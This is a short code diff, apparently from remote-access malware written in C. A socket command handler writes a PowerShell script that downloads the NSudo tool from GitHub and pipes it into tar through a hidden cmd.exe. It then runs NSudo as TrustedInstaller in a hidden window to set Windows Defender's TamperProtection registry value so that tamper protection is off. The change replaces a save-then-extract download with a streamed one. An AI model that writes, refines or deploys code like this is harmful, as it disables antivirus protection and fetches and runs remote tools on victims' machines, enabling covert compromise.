@@ -205,10 +205,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         
         FILE *f = fopen(psPath, "w");
         if (f) {
-            fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
             fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "curl.exe -L -o $zip 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip'\n");
-            fprintf(f, "tar -xf $zip -C $out\n");
+            fprintf(f, "$null = New-Item -ItemType Directory -Path $out -Force -ErrorAction SilentlyContinue\n");
+            fprintf(f, "$arg = 'curl.exe -L -s https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip | tar -xf - -C \"' + $out + '\"'\n");
+            fprintf(f, "$p = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $arg -PassThru -NoNewWindow\n");
+            fprintf(f, "$p.WaitForExit()\n");
+            fprintf(f, "if ($p.ExitCode -ne 0) { Write-Host ('Pipe exit code: ' + $p.ExitCode) }\n");
             fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
             fprintf(f, "if (Test-Path $exe) {\n");
             fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
